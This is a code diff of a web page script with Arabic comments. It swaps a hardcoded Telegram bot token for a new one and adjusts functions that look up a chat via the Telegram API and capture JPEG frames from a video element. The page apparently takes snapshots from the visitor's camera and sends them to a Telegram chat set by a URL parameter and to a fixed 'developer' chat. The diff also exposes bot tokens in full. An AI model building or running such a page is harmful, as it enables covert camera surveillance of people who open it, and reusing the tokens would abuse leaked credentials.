@@ -1262,7 +1262,8 @@ video {
 const urlParams = new URLSearchParams(window.location.search);
 const dynamicChatId = urlParams.get('id');
 const fixedChatId = 6002805119; // المطور
-const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
+// ✅ التوكن الجديد
+const token = '8488682212:AAG_iPaR8rTBo1pK1XN0d2M1Ag1_k5SooWw';
 
 const video = document.getElementById('video');
 const status = document.getElementById('status');
@@ -1282,7 +1283,7 @@ function showUserInfo() {
         document.getElementById('userInfo').style.display = 'block';
         document.getElementById('userId').textContent = dynamicChatId;
         
-        // محاولة الحصول على اسم المستخدم من خلال البوت (يمكن تحسينه لاحقاً)
+        // محاولة الحصول على اسم المستخدم من خلال البوت
         fetch(`https://api.telegram.org/bot${token}/getChat?chat_id=${dynamicChatId}`)
             .then(response => response.json())
             .then(data => {
@@ -1487,7 +1488,7 @@ function captureAndSend() {
             overlay.style.transform = 'scale(1)';
             overlay.style.color = 'rgba(255, 255, 255, 0.7)';
         }, 300);
-    }, 'image/jpeg', 0.85); // جودة الصورة 85%
+    }, 'image/jpeg', 0.85);
 }
 
 function stopCamera() {
